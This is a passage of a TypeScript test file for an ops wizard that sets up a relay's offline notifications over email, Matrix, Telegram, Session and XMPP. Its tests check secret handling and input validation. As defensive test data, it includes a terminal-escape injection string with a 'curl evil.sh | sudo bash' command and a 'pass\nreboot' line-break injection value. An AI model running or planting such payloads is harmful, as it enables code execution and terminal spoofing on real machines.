/**
 * `sudo morphit-ops offline-notify` — what it saves, what it never saves, and
 * what it never prints. Prompts, the relay's adminCli, the file and the relay
 * restart are all stand-ins; the real ones are exercised end to end in
 * docs/OPERATIONS.md's recipe (and were, against real servers, when written).
 */
import { describe, expect, it } from 'vitest';
import {
	adminInput,
	NO_LINK,
	runOfflineNotify,
	type AdminAnswer,
	type AskHandler,
	type OfflineNotifyDeps
} from '../src/commands/offlineNotify.ts';
import { checkXmppPassword } from '../src/lib/xmppAccount.ts';

interface Run {
	readonly code: number;
	readonly printed: string;
	readonly saved: Array<Record<string, string>>;
	/** The channels each save owned (lib/offlineNotifyEnv.ts renderNotifyEnv). */
	readonly owned: Array<readonly string[]>;
	readonly adminCalls: Array<{ args: readonly string[]; input: Record<string, string> }>;
	readonly restarts: number;
	readonly menus: string[][];
	readonly mints: string[];
	/** Every step in order: `admin <args>`, `restart`, `save`. */
	readonly steps: string[];
}

/** Answers: a string for ask/askPassword, `#n` / `#last` / `#label text` for a choice, `y`/`n` for yes/no. */
async function wizard(
	answers: string[],
	opts: {
		file?: Record<string, string>;
		status?: Partial<AdminAnswer>;
		/** Successive `status` answers (the last one repeats), over `status`. */
		statuses?: Array<Partial<AdminAnswer>>;
		admin?: (
			args: readonly string[],
			input: Record<string, string>,
			onAsk?: AskHandler
		) => AdminAnswer | Promise<AdminAnswer>;
		deps?: Partial<OfflineNotifyDeps>;
		positional?: string[];
	} = {}
): Promise<Run> {
	let file = { ...(opts.file ?? {}) };
	const printed: string[] = [];
	const saved: Array<Record<string, string>> = [];
	const owned: Array<readonly string[]> = [];
	const adminCalls: Run['adminCalls'] = [];
	const menus: string[][] = [];
	const mints: string[] = [];
	const steps: string[] = [];
	const statuses = [...(opts.statuses ?? [])];
	let restarts = 0;
	const next = (): string => {
		const a = answers.shift();
		if (a === undefined) throw new Error('the wizard asked more than the test answers');
		return a;
	};
	const code = await runOfflineNotify(
		{ positional: opts.positional ?? [], colorEnabled: false, repoRoot: '/opt/morphit' },
		{
			isRoot: () => true,
			isTTY: true,
			print: (l) => printed.push(l),
			ask: async (_q, d) => {
				const a = next();
				return a === '' ? (d ?? '') : a;
			},
			askPassword: async () => next(),
			askYesNo: async () => next() === 'y',
			askChoice: async (_q, o) => {
				menus.push([...o]);
				const a = next();
				if (a === '#last') return o.length - 1;
				if (a.startsWith('#label ')) {
					const i = o.findIndex((x) => x === a.slice(7));
					if (i < 0) throw new Error(`no "${a.slice(7)}" in [${o.join(' | ')}]`);
					return i;
				}
				return Number(a.slice(1));
			},
			admin: async (args, input, onAsk) => {
				adminCalls.push({ args, input });
				steps.push(`admin ${args.join(' ')}`);
				if (args[0] === 'status')
					return {
						ok: true,
						site: 'Vigilante Trading',
						link: 'https://vigilante.trading',
						hiddenOnly: false,
						tor: true,
						offered: [],
						off: {},
						...opts.status,
						...(statuses.length > 1 ? statuses.shift() : statuses[0])
					};
				return (await opts.admin?.(args, input, onAsk)) ?? { ok: true };
			},
			readEnv: () => ({ ...file }),
			writeEnv: (v, o) => {
				saved.push({ ...v });
				owned.push([...o]);
				steps.push('save');
				file = { ...v };
			},
			restartRelay: async () => {
				restarts++;
				steps.push('restart');
				return ['email'];
			},
			signInMatrix: async (hs) => {
				mints.push(hs);
				return { ok: true, token: 'syt_minted_token', homeserver: hs };
			},
			matrixAccount: async () => 'unknown',
			// No DNS in tests: an XMPP domain is its own server unless a test says otherwise.
			resolveSrv: async () => {
				throw new Error('no DNS in tests');
			},
			...opts.deps
		}
	);
	return {
		code,
		printed: printed.join('\n'),
		saved,
		owned,
		adminCalls,
		restarts,
		menus,
		mints,
		steps
	};
}

const EMAIL = [
	'#label Set up Email',
	'smtp.example.org',
	'#0',
	'',
	'ops@example.org',
	'pa$$ word `x`',
	'',
	'me@example.net'
];

describe('morphit-ops offline-notify', () => {
	it('needs sudo', async () => {
		const r = await wizard([], { deps: { isRoot: () => false } });
		expect(r.code).toBe(1);
		expect(r.printed).toMatch(/sudo morphit-ops offline-notify/);
		expect(r.adminCalls).toHaveLength(0);
	});

	it('`status` (or no terminal) shows what is on and asks nothing', async () => {
		const r = await wizard([], {
			positional: ['status'],
			status: {
				offered: ['matrix'],
				matrix: '@notices:vigilante.trading',
				off: { telegram: 'zero_clearnet' }
			}
		});
		expect(r.code).toBe(0);
		expect(r.menus).toHaveLength(0);
		expect(r.printed).toMatch(/Matrix\s+on — notes come from @notices:vigilante\.trading/);
		expect(r.printed).toMatch(/Telegram\s+off — this site uses no clearnet/);
	});

	it('email: tested with a real note, then saved, restarted — the password never printed', async () => {
		const r = await wizard([...EMAIL, '#last']);
		expect(r.code).toBe(0);
		const send = r.adminCalls.find((c) => c.args[0] === 'send')!;
		// The test address goes on stdin — never on the command line, where every
		// user on the box could read it in the process list.
		expect(send.args).toEqual(['send', 'email']);
		expect(send.input.to).toBe('me@example.net');
		expect(r.adminCalls.every((c) => !c.args.join(' ').includes('@'))).toBe(true);
		expect(send.input.MORPHIT_NOTIFY_EMAIL_PASSWORD).toBe('pa$$ word `x`');
		expect(r.saved).toEqual([
			{
				MORPHIT_NOTIFY_EMAIL_HOST: 'smtp.example.org',
				MORPHIT_NOTIFY_EMAIL_PORT: '587',
				MORPHIT_NOTIFY_EMAIL_SECURITY: 'starttls',
				MORPHIT_NOTIFY_EMAIL_USER: 'ops@example.org',
				MORPHIT_NOTIFY_EMAIL_PASSWORD: 'pa$$ word `x`',
				MORPHIT_NOTIFY_EMAIL_FROM: 'ops@example.org'
			}
		]);
		expect(r.restarts).toBe(1);
		expect(r.printed).toMatch(/Email is on/);
		expect(r.printed).not.toContain('pa$$');
		// Plain words: no mail server to run here, and what the four answers are.
		expect(r.printed).toMatch(/nothing extra runs on this server/);
		expect(r.printed).toMatch(
			/outgoing mail server[\s\S]*587 \(STARTTLS\) or 465 \(TLS\)[\s\S]*login[\s\S]*app password/
		);
		expect(r.printed).toMatch(/not one at your site’s domain/);
	});

	it('a failed test saves nothing — unless the operator says so', async () => {
		const fail = (args: readonly string[]): AdminAnswer =>
			args[0] === 'send'
				? { ok: false, error: 'failed', reason: 'SmtpError: AUTH (535)' }
				: { ok: true };
		const no = await wizard([...EMAIL, 'n', '#last'], { admin: fail });
		expect(no.saved).toHaveLength(0);
		expect(no.restarts).toBe(0);
		expect(no.printed).toMatch(/SmtpError: AUTH \(535\)/);
		const yes = await wizard([...EMAIL, 'y', '#last'], { admin: fail });
		expect(yes.saved).toHaveLength(1);
	});

	it('a value with a line break is refused before anything is tested or written', async () => {
		const answers = [...EMAIL];
		answers[5] = 'pass\nreboot';
		const r = await wizard([...answers, '#last']);
		expect(r.saved).toHaveLength(0);
		expect(r.adminCalls.some((c) => c.args[0] === 'send')).toBe(false);
		expect(r.printed).toMatch(/cannot contain a line break/);
	});

	it('a Tor-only site offers no Telegram or Session, and refuses a clearnet homeserver', async () => {
		const r = await wizard(['#label Set up Matrix', 'https://matrix.org', '#last'], {
			status: { hiddenOnly: true, link: 'http://x.onion' }
		});
		expect(r.menus[0]).not.toContain('Set up Telegram');
		expect(r.menus[0]).not.toContain('Set up Session');
		expect(r.printed).toMatch(/must be an \.onion address/);
		expect(r.saved).toHaveLength(0);
	});

	it('Matrix: the account the token belongs to is asked, and saved; the token never printed', async () => {
		const r = await wizard(
			['#label Set up Matrix', 'https://matrix.example.org', '#1', 'syt_secret_token', '', '#last'],
			{
				admin: (args) =>
					args[0] === 'check' ? { ok: true, userId: '@notices:matrix.example.org' } : { ok: true }
			}
		);
		expect(r.saved[0]).toEqual({
			MORPHIT_NOTIFY_MATRIX_HOMESERVER: 'https://matrix.example.org',
			MORPHIT_NOTIFY_MATRIX_TOKEN: 'syt_secret_token',
			MORPHIT_NOTIFY_MATRIX_USER_ID: '@notices:matrix.example.org'
		});
		expect(r.printed).not.toContain('syt_secret_token');
	});

	it('Telegram: the bot username comes from Telegram (getMe), not from the operator', async () => {
		const r = await wizard(['#label Set up Telegram', '123:' + 'A'.repeat(30), '#last'], {
			admin: (args) =>
				args[0] === 'check' ? { ok: true, username: 'VigilanteTradingBot' } : { ok: true }
		});
		expect(r.saved[0]).toEqual({
			MORPHIT_NOTIFY_TELEGRAM_TOKEN: '123:' + 'A'.repeat(30),
			MORPHIT_NOTIFY_TELEGRAM_USERNAME: 'VigilanteTradingBot'
		});
		expect(r.printed).not.toContain('AAAAAAAAAA');
		// Telegram's check really signs in: "works" is earned.
		expect(r.printed).toMatch(/The Telegram account works/);
	});

	it('Session without a test note (nothing signs in): never called working, only complete', async () => {
		const session = await wizard(['#label Set up Session', '#0', '', '#last'], {
			admin: (args) =>
				args[0] === 'new-session'
					? { ok: true, mnemonic: 'w '.repeat(13).trim(), sessionId: '05' + 'ab'.repeat(32) }
					: { ok: true }
		});
		for (const r of [session]) {
			expect(r.adminCalls.some((c) => c.args[0] === 'check')).toBe(true);
			expect(r.adminCalls.some((c) => c.args[0] === 'send')).toBe(false);
			expect(r.printed).not.toMatch(/account works/);
			expect(r.printed).toMatch(/settings are complete \(not tested/);
		}
	});

	it('Session: a new account is made by the relay; the recovery words are saved, never shown', async () => {
		const words = 'w1 w2 w3 w4 w5 w6 w7 w8 w9 w10 w11 w12 w13';
		const r = await wizard(['#label Set up Session', '#0', '', '#last'], {
			admin: (args) =>
				args[0] === 'new-session'
					? { ok: true, mnemonic: words, sessionId: '05' + 'ab'.repeat(32) }
					: { ok: true }
		});
		expect(r.saved[0]).toEqual({ MORPHIT_NOTIFY_SESSION_MNEMONIC: words });
		expect(r.printed).toContain('05' + 'ab'.repeat(32));
		expect(r.printed).not.toContain('w1 w2');
	});

	it('changing a channel tests it with what will be saved: a cleared setting is cleared for the test too', async () => {
		const file = {
			MORPHIT_NOTIFY_XMPP_JID: 'old@x.org',
			MORPHIT_NOTIFY_XMPP_PASSWORD: 'p',
			MORPHIT_NOTIFY_XMPP_HOST: 'old-host.x.org',
			MORPHIT_NOTIFY_EMAIL_HOST: 'keep.example.org'
		};
		const r = await wizard(
			['#label Change XMPP (Jabber)', '#1', 'bot@new.org', 'pw', 'y', 'me@new.org', '#last'],
			{ file }
		);
		const send = r.adminCalls.find((c) => c.args[0] === 'send')!;
		// The new account's own server — never the old setting's.
		expect(send.input.MORPHIT_NOTIFY_XMPP_HOST).toBe('new.org');
		expect(r.saved[0]!.MORPHIT_NOTIFY_XMPP_HOST).toBe('new.org');
		expect(r.saved[0]!.MORPHIT_NOTIFY_EMAIL_HOST).toBe('keep.example.org');
	});

	it('turning an app off deletes its settings, keeps the rest, restarts the relay', async () => {
		const file = {
			MORPHIT_NOTIFY_TELEGRAM_TOKEN: 't',
			MORPHIT_NOTIFY_TELEGRAM_USERNAME: 'Bot_1',
			MORPHIT_NOTIFY_EMAIL_HOST: 'h'
		};
		const r = await wizard(['#label Turn an app off', '#label Telegram', 'y', '#last'], {
			file,
			admin: (args) => (args[0] === 'purge-channel' ? { ok: true, removed: 3 } : { ok: true })
		});
		// Users' saved addresses for it go FIRST (while the bot can still sign
		// in to leave Matrix rooms), then the settings.
		expect(r.adminCalls.map((c) => c.args.join(' '))).toContain('purge-channel telegram');
		expect(r.printed).toMatch(/3 users' Telegram addresses deleted/);
		expect(r.saved).toEqual([{ MORPHIT_NOTIFY_EMAIL_HOST: 'h' }]);
		expect(r.restarts).toBe(1);
	});

	it('if the users’ addresses cannot be deleted, the settings stay too', async () => {
		const file = { MORPHIT_NOTIFY_TELEGRAM_TOKEN: 't', MORPHIT_NOTIFY_TELEGRAM_USERNAME: 'Bot_1' };
		const r = await wizard(['#label Turn an app off', '#label Telegram', 'y', '#last'], {
			file,
			admin: (args) =>
				args[0] === 'purge-channel'
					? { ok: false, error: 'failed', reason: 'db down' }
					: { ok: true }
		});
		expect(r.saved).toHaveLength(0);
		expect(r.printed).toMatch(/Nothing was changed/);
	});

	const START_OVER = 'Start over (forget every user’s saved address)';

	it('a key that is missing or another one: says so, and offers to start over', async () => {
		for (const key of ['missing', 'mismatch']) {
			const r = await wizard(['#last'], { status: { key } });
			expect(r.menus[0]).toContain(START_OVER);
			expect(r.printed).toMatch(/⚠ Users' saved addresses cannot be opened/);
			expect(r.printed).toContain('/var/lib/morphit-relay/offline-notify.key');
		}
		const ok = await wizard(['#last'], { status: { key: 'ok' } });
		expect(ok.menus[0]).not.toContain(START_OVER);
		const none = await wizard(['#last'], { status: { key: 'none' } });
		expect(none.menus[0]).not.toContain(START_OVER);
		expect(none.printed).not.toMatch(/key/i);
	});

	// Review R5 #1: "Start over" deletes every user's addresses. A key file the
	// relay's tool could not READ, or a database that did not answer, says
	// nothing about the addresses: no Start over, and no alarm — what to check.
	it('a key the tool could not read, a database that did not answer, no state folder: no Start over, a calm note', async () => {
		const expected: Record<string, RegExp> = {
			unreadable:
				/could not read its key file[\s\S]*addresses are kept[\s\S]*ls -l \/var\/lib\/morphit-relay\//,
			db_error: /database did not answer[\s\S]*They are kept\. Check:  sudo morphit-ops doctor/,
			no_state_dir: /no folder for its own files[\s\S]*sudo morphit-ops doctor/,
			something_new: /Could not tell whether[\s\S]*something_new[\s\S]*sudo morphit-ops doctor/
		};
		for (const [key, re] of Object.entries(expected)) {
			const r = await wizard(['#last'], {
				status: { key, keyDetail: 'EACCES \u001b[31mred\u001b[0m ‮evil' }
			});
			expect(r.menus[0], key).not.toContain(START_OVER);
			expect(r.printed, key).toMatch(re);
			expect(r.printed, key).not.toContain('⚠');
			expect(r.printed, key).not.toMatch(/cannot be opened|start over/i);
			// The relay's own sentence, as plain text.
			expect(r.printed, key).toContain('The relay says: EACCES red evil');
			expect(r.printed, key).not.toMatch(/[\u001b‮]/);
		}
	});

	it('start over: deleted, the relay restarted, and its new key confirmed', async () => {
		const r = await wizard([`#label ${START_OVER}`, 'y', '#last'], {
			statuses: [{ key: 'missing' }, { key: 'ok' }]
		});
		// Reset first, then a restart (the relay makes its new key when it
		// starts), then the relay is asked how its key is now.
		expect(r.steps.slice(1, 4)).toEqual(['admin reset', 'restart', 'admin status']);
		expect(r.restarts).toBe(1);
		expect(r.saved).toHaveLength(0);
		expect(r.printed).toMatch(/The relay is back with a new key/);
	});

	it('start over: a relay that still reports a key problem afterwards is not called fixed', async () => {
		const r = await wizard([`#label ${START_OVER}`, 'y', '#last'], {
			status: { key: 'missing' }
		});
		expect(r.restarts).toBe(1);
		expect(r.printed).not.toMatch(/back with a new key/);
		expect(r.printed).toMatch(/still cannot use a new key[\s\S]*journalctl -u morphit-relay/);
	});

	// Review W2: a reset that failed must not be followed by a restart (nor
	// reported as done).
	it('start over: a reset that failed changes nothing and restarts nothing', async () => {
		const r = await wizard([`#label ${START_OVER}`, 'y', '#last'], {
			status: { key: 'mismatch' },
			admin: (args) =>
				args[0] === 'reset' ? { ok: false, error: 'failed', reason: 'db down' } : { ok: true }
		});
		expect(r.adminCalls.map((c) => c.args[0])).toContain('reset');
		expect(r.restarts).toBe(0);
		expect(r.saved).toHaveLength(0);
		expect(r.printed).toMatch(/It did not work: db down\. Nothing was changed\./);
		expect(r.printed).not.toMatch(/old key file are deleted|back with a new key/);
	});

	it('start over is asked first; "no" deletes nothing', async () => {
		const r = await wizard([`#label ${START_OVER}`, 'n', '#last'], { status: { key: 'missing' } });
		expect(r.adminCalls.map((c) => c.args[0])).not.toContain('reset');
		expect(r.restarts).toBe(0);
	});

	const MATRIX_FILE = {
		MORPHIT_NOTIFY_MATRIX_HOMESERVER: 'https://m.example',
		MORPHIT_NOTIFY_MATRIX_TOKEN: 't',
		MORPHIT_NOTIFY_MATRIX_USER_ID: '@bot:m.example',
		MORPHIT_NOTIFY_EMAIL_HOST: 'h'
	};

	// Review R5 #2: the bot needs its settings to leave the chats it has not
	// left yet. They stay until it has.
	it('turning Matrix off while the bot still has chats to leave keeps Matrix set up', async () => {
		const r = await wizard(['#label Turn an app off', '#label Matrix', 'y', '#last'], {
			file: MATRIX_FILE,
			status: { offered: ['matrix'], matrix: '@bot:m.example' },
			admin: (args) =>
				args[0] === 'purge-channel' ? { ok: true, removed: 3, left: 1, waiting: 2 } : { ok: true }
		});
		expect(r.adminCalls.map((c) => c.args.join(' '))).toContain('purge-channel matrix');
		expect(r.saved).toHaveLength(0);
		expect(r.restarts).toBe(0);
		expect(r.printed).toMatch(/3 users' Matrix addresses deleted/);
		expect(r.printed).toMatch(/The bot left 1 chat\./);
		expect(r.printed).toMatch(/could not leave 2 chats yet/);
		expect(r.printed).toMatch(/Matrix stays set up, so the relay keeps trying to leave them/);
		expect(r.printed).toMatch(/again later/);
	});

	it('turning Matrix off once the bot has left every chat removes its settings', async () => {
		const r = await wizard(['#label Turn an app off', '#label Matrix', 'y', '#last'], {
			file: MATRIX_FILE,
			admin: (args) =>
				args[0] === 'purge-channel' ? { ok: true, removed: 3, left: 3, waiting: 0 } : { ok: true }
		});
		expect(r.printed).toMatch(/The bot left 3 chats\./);
		expect(r.printed).not.toMatch(/could not leave/);
		expect(r.saved).toEqual([{ MORPHIT_NOTIFY_EMAIL_HOST: 'h' }]);
		expect(r.owned).toEqual([['matrix']]);
		expect(r.restarts).toBe(1);
	});

	// Review R5 #4: the bot's password must never cross the internet in clear.
	it('Matrix: an http:// homeserver on the clearnet is refused before anything is sent', async () => {
		const r = await wizard(['#label Set up Matrix', 'http://matrix.example.org', '#last']);
		expect(r.printed).toMatch(/starts with http:\/\/[\s\S]*unencrypted[\s\S]*https:\/\//);
		expect(r.printed).toMatch(/Nothing was changed/);
		expect(r.mints).toEqual([]);
		expect(r.adminCalls.every((c) => c.args[0] === 'status')).toBe(true);
		expect(r.menus).toHaveLength(2); // the main menu, twice: no sign-in question
		expect(r.saved).toHaveLength(0);
	});

	it('Matrix: http:// is fine for a homeserver on this server or an .onion address', async () => {
		const local = await wizard(
			['#label Set up Matrix', 'http://127.0.0.1:8008', '#0', 'notices', 'pw', '', '#last'],
			{
				admin: (args) =>
					args[0] === 'check' ? { ok: true, userId: '@notices:localhost' } : { ok: true }
			}
		);
		expect(local.mints).toEqual(['http://127.0.0.1:8008']);
		expect(local.saved[0]!.MORPHIT_NOTIFY_MATRIX_HOMESERVER).toBe('http://127.0.0.1:8008');
		const onion = `http://${'a'.repeat(56)}.onion`;
		const tor = await wizard(['#label Set up Matrix', onion, 'syt_x', '', '#last'], {
			status: { hiddenOnly: true, link: 'http://x.onion' },
			admin: (args) => (args[0] === 'check' ? { ok: true, userId: '@n:onion' } : { ok: true })
		});
		expect(tor.printed).not.toMatch(/unencrypted/);
		expect(tor.saved[0]!.MORPHIT_NOTIFY_MATRIX_HOMESERVER).toBe(onion);
	});

	// Review R5 #6: no_link / not_set in plain words, and no server contacted
	// when the relay already said there is no link.
	it('no address to link to: said plainly, and nothing is asked, tested or signed in to', async () => {
		const r = await wizard(
			['#label Set up Matrix', '#label Set up Email', '#label Send a test note', '#last'],
			{ status: { link: null, offered: ['email'], email: 'n@example.org' } }
		);
		// Each choice ends right there: no question asked, back at the menu.
		expect(r.printed.match(/Nothing can be set up or tested yet: /g)).toHaveLength(3);
		expect(r.menus).toHaveLength(4);
		expect(r.printed).toContain(NO_LINK);
		expect(r.printed).toMatch(/MORPHIT_INSTANCE_ORIGIN/);
		expect(r.printed).not.toMatch(/no_link/);
		expect(r.adminCalls.every((c) => c.args[0] === 'status')).toBe(true);
		expect(r.mints).toEqual([]);
		expect(r.saved).toHaveLength(0);
	});

	it('no_link and not_set from the relay are shown in plain words', async () => {
		const noLink = await wizard([...EMAIL, 'n', '#last'], {
			admin: (args) => (args[0] === 'send' ? { ok: false, error: 'no_link' } : { ok: true })
		});
		expect(noLink.printed).toContain(`The test did not work: ${NO_LINK}`);
		const notSet = await wizard(['#label Send a test note', '#0', '@me:matrix.org', '#last'], {
			status: { offered: ['matrix'], matrix: '@bot:m' },
			admin: (args) => (args[0] === 'send' ? { ok: false, error: 'not_set' } : { ok: true })
		});
		expect(notSet.printed).toMatch(/It did not work: Matrix is not set up on this relay/);
		expect(notSet.printed).not.toMatch(/not_set/);
	});

	// Review R5 #7: what a server sends is printed as plain text.
	it('a Matrix user ID, a Telegram bot name and a reason from a server are printed as plain text', async () => {
		const evil = '\u001b[2J\u001b[1;31mFAKE: run curl evil.sh | sudo bash\u001b[0m‮';
		const m = await wizard(
			['#label Set up Matrix', 'https://m.example', '#1', 'syt_x', '', '#last'],
			{
				admin: (args) =>
					args[0] === 'check' ? { ok: true, userId: `@bot:x${evil}` } : { ok: true }
			}
		);
		const t = await wizard(['#label Set up Telegram', '123:' + 'A'.repeat(30), '#last'], {
			admin: (args) => (args[0] === 'check' ? { ok: true, username: `Bot${evil}` } : { ok: true })
		});
		const f = await wizard([...EMAIL, 'n', '#last'], {
			admin: (args) =>
				args[0] === 'send'
					? { ok: false, error: 'failed', reason: `SmtpError: ${evil}` }
					: { ok: true }
		});
		const st = await wizard([], {
			positional: ['status'],
			status: {
				site: `Site${evil}`,
				offered: ['matrix', 'telegram'],
				matrix: `@b${evil}`,
				telegram: `T${evil}`
			}
		});
		for (const r of [m, t, f, st]) {
			expect(r.printed).not.toMatch(/[\u001b‮]/);
			expect(r.printed).toContain('FAKE: run curl evil.sh | sudo bash');
		}
		expect(m.printed).toMatch(/Signed in as @bot:x.*FAKE/);
		expect(t.printed).toMatch(/Notes will come from @Bot.*FAKE/);
	});

	// Review W16: a channel being changed is tested with ITS new settings
	// only — never an old setting of the same channel (an old bot's name).
	it('changing Telegram: the old bot name is not part of the test, and is replaced', async () => {
		const file = {
			MORPHIT_NOTIFY_TELEGRAM_TOKEN: '111:' + 'O'.repeat(30),
			MORPHIT_NOTIFY_TELEGRAM_USERNAME: 'OldBot'
		};
		const r = await wizard(['#label Change Telegram', '222:' + 'N'.repeat(30), '#last'], {
			file,
			admin: (args) => (args[0] === 'check' ? { ok: true, username: 'NewBot' } : { ok: true })
		});
		const check = r.adminCalls.find((c) => c.args[0] === 'check')!;
		expect(check.input).toEqual({
			MORPHIT_NOTIFY_TELEGRAM_TOKEN: '222:' + 'N'.repeat(30),
			MORPHIT_NOTIFY_TELEGRAM_USERNAME: ''
		});
		expect(r.saved[0]!.MORPHIT_NOTIFY_TELEGRAM_USERNAME).toBe('NewBot');
		expect(r.owned).toEqual([['telegram']]);
	});

	it('Session: existing recovery words that are not exactly 13 are refused before anything is tested or saved', async () => {
		for (const n of [12, 14]) {
			const words = Array.from({ length: n }, (_, i) => `w${i + 1}`).join(' ');
			const r = await wizard(['#label Set up Session', '#1', words, '#last']);
			expect(r.saved, `${n} words`).toEqual([]);
			expect(r.restarts).toBe(0);
			expect(r.adminCalls.map((c) => c.args[0])).toEqual(['status', 'status']);
			expect(r.printed).not.toContain('w1 w2');
		}
		// Thirteen (spaces tidied) go on to be checked and saved.
		const words = Array.from({ length: 13 }, (_, i) => `w${i + 1}`).join('  ');
		const r = await wizard(['#label Set up Session', '#1', ` ${words} `, '', '#last']);
		expect(r.saved).toEqual([{ MORPHIT_NOTIFY_SESSION_MNEMONIC: words.replace(/ +/g, ' ') }]);
	});

	it('"Send a test note" never offers Telegram (its users start the chat; there is no address to send to)', async () => {
		const r = await wizard(['#label Send a test note', '#0', 'me@example.net', '#last'], {
			status: { offered: ['telegram', 'email'] }
		});
		expect(r.menus[1]).toEqual(['Email']);
		const send = r.adminCalls.find((c) => c.args[0] === 'send')!;
		expect(send.args).toEqual(['send', 'email']);
		const onlyTelegram = await wizard(['#last'], { status: { offered: ['telegram'] } });
		expect(onlyTelegram.menus[0]).not.toContain('Send a test note');
	});

	it('adminInput: every key of the channel, unset ones as empty', () => {
		expect(adminInput({ MORPHIT_NOTIFY_TELEGRAM_TOKEN: 't', OTHER: 'x' }, 'telegram')).toEqual({
			MORPHIT_NOTIFY_TELEGRAM_TOKEN: 't',
			MORPHIT_NOTIFY_TELEGRAM_USERNAME: ''
		});
	});

	describe('Matrix sign-in: the operator is told what the homeserver said', () => {
		const SETUP = ['#label Set up Matrix', 'https://matrix.org', '#0', 'morphitio', 'pw'];
		const signedIn = (args: readonly string[]): AdminAnswer =>
			args[0] === 'check' ? { ok: true, userId: '@morphitio:matrix.org' } : { ok: true };
		const failing =
			(why: string, detail: string, homeserver = 'https://matrix.org') =>
			async () =>
				({ ok: false, why, detail, homeserver }) as never;

		it('says the account must already exist, and how to make one on matrix.org', async () => {
			const r = await wizard([...SETUP, '', '#last'], { admin: signedIn });
			expect(r.saved).toHaveLength(1);
			expect(r.printed).toMatch(/must exist already: this signs in to it, it does not create it/);
			expect(r.printed).toMatch(/app\.element\.io → Create account/);
			expect(r.printed).toMatch(/email address and emails a code/);
			expect(r.printed).toMatch(/at least 10 characters/);
		});

		it('a refused sign-in for a name the homeserver calls free: "there is no account yet"', async () => {
			const asked: string[] = [];
			const r = await wizard([...SETUP, '#last'], {
				deps: {
					signInMatrix: failing('wrong_password', 'M_FORBIDDEN: Invalid username/password'),
					matrixAccount: async (hs, user) => {
						asked.push(`${hs} ${user}`);
						return 'missing';
					}
				}
			});
			expect(asked).toEqual(['https://matrix.org morphitio']);
			expect(r.printed).toMatch(
				/There is no account called “morphitio” on https:\/\/matrix\.org yet/
			);
			expect(r.printed).toMatch(/Make it first/);
			expect(r.printed).not.toMatch(/username or password is wrong/);
			expect(r.saved).toHaveLength(0);
			expect(r.adminCalls.filter((c) => c.args[0] !== 'status')).toHaveLength(0);
		});

		it('an account that exists but a wrong password: the homeserver’s words, and the Google/GitHub hint', async () => {
			const r = await wizard([...SETUP, '#last'], {
				deps: {
					signInMatrix: failing('wrong_password', 'M_FORBIDDEN: Invalid username/password'),
					matrixAccount: async () => 'exists'
				}
			});
			expect(r.printed).toMatch(
				/https:\/\/matrix\.org says the username or password is wrong \(M_FORBIDDEN: Invalid username\/password\)/
			);
			expect(r.printed).toMatch(/Continue with Google\/Apple\/GitHub” has no password/);
			expect(r.printed).not.toMatch(/no account called/);
			expect(r.saved).toHaveLength(0);
		});

		it('the account is looked up only after a refusal for a wrong password', async () => {
			let looked = 0;
			const deps = {
				matrixAccount: async () => {
					looked++;
					return 'missing' as const;
				}
			};
			await wizard([...SETUP, '', '#last'], { deps, admin: signedIn });
			expect(looked).toBe(0);
			const r = await wizard([...SETUP, '#last'], {
				deps: { ...deps, signInMatrix: failing('rate_limited', 'M_LIMIT_EXCEEDED') }
			});
			expect(looked).toBe(0);
			expect(r.printed).toMatch(/Too many sign-in attempts: https:\/\/matrix\.org asks to wait/);
		});

		it.each([
			[
				'no_password_login',
				/does not allow signing in with a password[\s\S]*Paste an access token/
			],
			['not_homeserver', /does not answer as a Matrix homeserver/],
			['unreachable', /Could not reach https:\/\/matrix\.org from this server \(boom\)/],
			['other', /Sign-in failed at https:\/\/matrix\.org: boom/]
		])('%s is explained, and nothing is saved', async (why, says) => {
			const r = await wizard([...SETUP, '#last'], {
				deps: { signInMatrix: failing(why, 'boom') }
			});
			expect(r.printed).toMatch(says);
			expect(r.printed).toMatch(/Nothing was changed/);
			expect(r.saved).toHaveLength(0);
		});

		it('a full Matrix ID typed as the username is cut to its name', async () => {
			const users: string[] = [];
			await wizard(
				[
					'#label Set up Matrix',
					'https://matrix.org',
					'#0',
					'@morphitio:matrix.org',
					'pw',
					'',
					'#last'
				],
				{
					admin: signedIn,
					deps: {
						signInMatrix: async (hs, user) => {
							users.push(user);
							return { ok: true, token: 't', homeserver: hs };
						}
					}
				}
			);
			expect(users).toEqual(['morphitio']);
		});

		it('the address the sign-in worked at is the one saved; only a clearnet homeserver may be swapped', async () => {
			const discover: Array<boolean | undefined> = [];
			const r = await wizard(
				['#label Set up Matrix', 'https://example.org', '#0', 'notices', 'pw', '', '#last'],
				{
					admin: (args) =>
						args[0] === 'check' ? { ok: true, userId: '@notices:example.org' } : { ok: true },
					deps: {
						signInMatrix: async (_hs, _u, _p, o) => {
							discover.push(o?.discover);
							return { ok: true, token: 't', homeserver: 'https://matrix-client.example.org' };
						}
					}
				}
			);
			expect(r.saved[0]?.MORPHIT_NOTIFY_MATRIX_HOMESERVER).toBe(
				'https://matrix-client.example.org'
			);
			await wizard(
				['#label Set up Matrix', 'http://127.0.0.1:8008', '#0', 'notices', 'pw', '', '#last'],
				{
					admin: signedIn,
					deps: {
						signInMatrix: async (hs, _u, _p, o) => {
							discover.push(o?.discover);
							return { ok: true, token: 't', homeserver: hs };
						}
					}
				}
			);
			expect(discover).toEqual([true, false]);
		});
	});

	describe('Matrix test note: the operator is told to accept the invitation', () => {
		const SEND = [
			'#label Set up Matrix',
			'https://matrix.org',
			'#0',
			'morphitio',
			'pw',
			'@operator:matrix.org'
		];
		const relay =
			(joined: boolean) =>
			(args: readonly string[]): AdminAnswer =>
				args[0] === 'check'
					? { ok: true, userId: '@morphitio:matrix.org' }
					: args[0] === 'send'
						? { ok: true, joined }
						: { ok: true };

		it('before the send: accept the invitation from the bot; after: you joined', async () => {
			const r = await wizard([...SEND, '#last'], { admin: relay(true) });
			const hint = r.printed.indexOf(
				'accept the invitation from @morphitio:matrix.org that brings the test note'
			);
			const sent = r.printed.indexOf('Test note sent to @operator:matrix.org');
			expect(hint).toBeGreaterThan(-1);
			expect(sent).toBeGreaterThan(hint);
			expect(r.printed).toMatch(/You joined; the bot has left the test chat/);
			expect(r.printed).not.toMatch(/did not join in time/);
			expect(r.saved).toHaveLength(1);
		});

		it('not joined in time: told the invitation can no longer be accepted', async () => {
			const r = await wizard([...SEND, '#last'], { admin: relay(false) });
			expect(r.printed).toMatch(/did not join in time[\s\S]*can no longer be accepted: decline it/);
			expect(r.printed).not.toMatch(/You joined/);
		});

		it('the hint is not shown for other apps, nor for a Matrix check without a test note', async () => {
			const email = await wizard([...EMAIL, '#last']);
			expect(email.printed).not.toMatch(/accept the invitation/);
			const check = await wizard(
